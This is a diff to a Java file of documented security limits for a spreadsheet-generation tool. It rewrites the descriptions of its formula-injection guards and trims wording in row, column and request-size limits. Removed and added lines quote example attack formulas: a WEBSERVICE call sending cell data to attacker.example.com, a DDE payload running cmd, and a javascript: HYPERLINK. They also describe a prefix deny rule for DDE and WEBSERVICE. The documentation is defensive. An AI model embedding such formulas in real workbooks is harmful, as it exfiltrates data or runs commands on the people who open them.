@@ -497,7 +497,7 @@ public record Limit(
           List.of("INVALID_REQUEST"),
           "",
           List.of("FormulaInputSecurity.rejectDde"),
-          "Excel's `WEBSERVICE` function sends an outbound HTTP GET request when the workbook is opened and\nformulas are evaluated, making it a data-exfiltration vector. A formula such as\n`=WEBSERVICE(\"https://attacker.example.com/collect?d=\"&ENCODEURL(A1))` causes the downstream\nExcel client to send cell data to an attacker-controlled server without any user interaction.\n`FormulaInputSecurity.rejectDde` now also rejects formulas beginning with `WEBSERVICE(`\n(case-insensitive) after stripping any leading `=` or `{=…}` array-formula delimiters.");
+          "FormulaInputSecurity.rejectDde rejects a formula beginning with `WEBSERVICE(`, ignoring case,\nafter removing one leading `=` or surrounding `{=...}` delimiters. This is a prefix check,\nnot a formula parser: it does not establish that nested or otherwise embedded function calls\nare absent. Hosts must assess the formulas and the spreadsheet client that will consume them.");
 
   /** Named-Range Formula Injection. */
   public static final Limit NAMED_RANGE_FORMULA_INJECTION =
@@ -509,7 +509,7 @@ public record Limit(
           List.of("INVALID_REQUEST"),
           "",
           List.of("NamedRangeTarget.Formula"),
-          "Named-range formulas are written into the xlsx defined-names part and evaluated automatically by\nExcel when the workbook is opened or any formula references the named range. A `NamedRangeTarget`\nwith `kind: FORMULA` and a payload such as `DDE(\"cmd\",\"/C calc\",\"\")` or\n`WEBSERVICE(\"https://attacker.example.com/\")` would execute without any user interaction.\n`NamedRangeTarget.Formula` now calls `FormulaInputSecurity.rejectDde` in its compact constructor.");
+          "`NamedRangeTarget.Formula` uses the wire discriminator `type: FORMULA`. Its constructor calls\n`FormulaInputSecurity.rejectDde` before a formula can be authored into the defined-names part.\nThe guard rejects leading `DDE(` and `WEBSERVICE(` calls, ignoring case and removing one leading\n`=` or surrounding `{=...}` delimiters. It does not parse nested function calls.");
 
   /** Chart Title Formula Injection. */
   public static final Limit CHART_TITLE_FORMULA_INJECTION =
@@ -521,7 +521,7 @@ public record Limit(
           List.of("INVALID_REQUEST"),
           "",
           List.of("ChartTitleSpec.Formula"),
-          "Chart title formulas are stored in the chart XML and auto-evaluated when Excel renders the chart\non workbook open. A `ChartTitleSpec` with `type: FORMULA` and a DDE or WEBSERVICE payload executes\nwithout user interaction. `ChartTitleSpec.Formula` now calls `FormulaInputSecurity.rejectDde`.");
+          "`ChartTitleSpec.Formula` uses `type: FORMULA` and calls `FormulaInputSecurity.rejectDde`\nin its constructor. The guard rejects leading `DDE(` and `WEBSERVICE(` calls, ignoring case\nand removing one leading `=` or surrounding `{=...}` delimiters. It does not parse nested\nfunction calls or certify how a downstream spreadsheet client will evaluate the stored title.");
 
   /** UDF Formula Template Injection (Defense-in-Depth). */
   public static final Limit UDF_FORMULA_TEMPLATE_INJECTION_DEFENSE_IN_DEPTH =
@@ -533,7 +533,7 @@ public record Limit(
           List.of("INVALID_REQUEST"),
           "",
           List.of("FormulaUdfFunctionSpec.formulaTemplate"),
-          "UDF formula templates are evaluated server-side only by Apache POI, which does not implement DDE\nor WEBSERVICE and would return an evaluation error for those functions. Templates are also never\nwritten to xlsx output — only the UDF call site (e.g., `MY_FUNC(arg)`) appears in the file.\nThe guard is applied as defense-in-depth against future POI changes or alternative evaluation paths.");
+          "`FormulaUdfFunctionSpec` applies `FormulaInputSecurity.rejectDde` to its formula template\nin the constructor. This uses the same leading-function guard as other formula surfaces;\nit does not parse the complete expression. UDF templates are evaluated server-side by the\nregistered formula runtime, so this check is one constraint on authored templates rather\nthan a general-purpose sandbox.");
 
   /** HYPERLINK() Formula Content Not Validated Against URL Allowlist. */
   public static final Limit HYPERLINK_FORMULA_CONTENT_NOT_VALIDATED_AGAINST_URL_ALLOWLIST =
@@ -545,7 +545,7 @@ public record Limit(
           List.of(),
           "",
           List.of("CellValueSpec.Formula", "NamedRangeTarget.Formula", "ChartTitleSpec.Formula"),
-          "The URL scheme allowlist in LIM-028 applies to `HyperlinkInput`, not to formula-embedded\nhyperlinks. A formula such as `=HYPERLINK(\"javascript:evil()\")` passes `FormulaInputSecurity.rejectDde`\nand is written to the xlsx file. The risk delta versus LIM-028 is limited: `HYPERLINK()` requires a\nuser click to navigate and is not auto-evaluated on workbook open. The `DDE(` and `WEBSERVICE(` patterns\nthat execute automatically are already blocked. Closing this gap fully would require an embedded\nformula parser; the accepted residual risk is click-triggered URI navigation only.");
+          "The URL scheme allowlist in LIM-028 applies to `HyperlinkTarget.Url`. It does not inspect\nURL arguments embedded in formula strings. For example, `HYPERLINK(\"javascript:evil()\")`\npasses `FormulaInputSecurity.rejectDde`. Acceptance by this guard is not evidence that a\nformula URL is safe; navigation and evaluation depend on the consuming spreadsheet client.");
 
   /** RTD() Function Not Blocked. */
   public static final Limit RTD_FUNCTION_NOT_BLOCKED =
@@ -557,7 +557,7 @@ public record Limit(
           List.of(),
           "",
           List.of("all formula inputs"),
-          "`RTD()` connects to a registered Windows COM automation server when the workbook is opened on\nWindows. `FormulaInputSecurity.rejectDde` does not block `RTD()`. The risk is platform-scoped:\n`RTD()` is a no-op on macOS and Linux, and on Windows it requires a pre-registered COM server on\nthe consuming workstation. GridGrind targets server-side xlsx generation workloads where COM\ninfrastructure is absent. Blocking `RTD()` would require a formula parser; the accepted risk is\nWindows-only and depends on attacker-controlled COM registration on the target machine.");
+          "`FormulaInputSecurity.rejectDde` does not reject a leading `RTD(` call or inspect RTD\narguments. The authored formula guard is limited to the leading DDE and WEBSERVICE patterns.\nHosts must assess the consuming client's external-data and automation capabilities; successful\nGridGrind authoring does not establish that downstream evaluation is isolated.");
 
   /** Source workbook content is admitted as OOXML independently of its suffix. */
   public static final Limit WORKBOOK_SOURCE_CONTENT_FORMAT =
@@ -596,7 +596,7 @@ public record Limit(
           List.of(),
           "Last valid zero-based row index: "
               + String.format(Locale.ROOT, "%,d", MAX_ROW_INDEX)
-              + ".\n\nGridGrind already rejects out-of-bounds addressed rows on the public request path for selectors,\nrow-band operations, row-structural edits, and print-title row bands instead of deferring those\nerrors to Apache POI.");
+              + ".\n\nGridGrind rejects out-of-bounds addressed rows on the public request path for selectors,\nrow-band operations, row-structural edits, and print-title row bands instead of deferring those\nerrors to Apache POI.");
 
   /** Maximum Columns per Worksheet. */
   public static final Limit MAXIMUM_COLUMNS_PER_WORKSHEET =
@@ -610,7 +610,7 @@ public record Limit(
           List.of(),
           "Last valid zero-based column index: "
               + String.format(Locale.ROOT, "%,d", MAX_COLUMN_INDEX)
-              + ".\n\nGridGrind already rejects out-of-bounds addressed columns on the public request path for\nselectors, column-band operations, column-structural edits, and print-title column bands.");
+              + ".\n\nGridGrind rejects out-of-bounds addressed columns on the public request path for\nselectors, column-band operations, column-structural edits, and print-title column bands.");
 
   /** Maximum Text Characters per Cell. */
   public static final Limit MAXIMUM_TEXT_CHARACTERS_PER_CELL =
@@ -765,7 +765,7 @@ public record Limit(
               "--request <path>",
               "GridGrindJson.readRequest(InputStream)",
               "GridGrindJson.readRequest(byte[])"),
-          "GridGrind accepts large authored values through source-backed inputs (`UTF8_FILE`, `FILE`, and\n`STANDARD_INPUT`), not by letting the outer request document grow without bound. The CLI now\nrejects oversized request files before execution starts, and the JSON codec enforces the same\ndocument cap on stdin and byte-array entry points so every transport path fails with one stable\nproduct-owned `INVALID_REQUEST` message.");
+          "GridGrind accepts large authored values through source-backed inputs (`UTF8_FILE`, `FILE`, and\n`STANDARD_INPUT`), not by letting the outer request document grow without bound. The CLI\nrejects oversized request files before execution starts, and the JSON codec enforces the same\ndocument cap on stdin and byte-array entry points so every transport path fails with one stable\nproduct-owned `INVALID_REQUEST` message.");
 
   /** Sheet Zoom Percentage. */
   public static final Limit SHEET_ZOOM_PERCENTAGE =
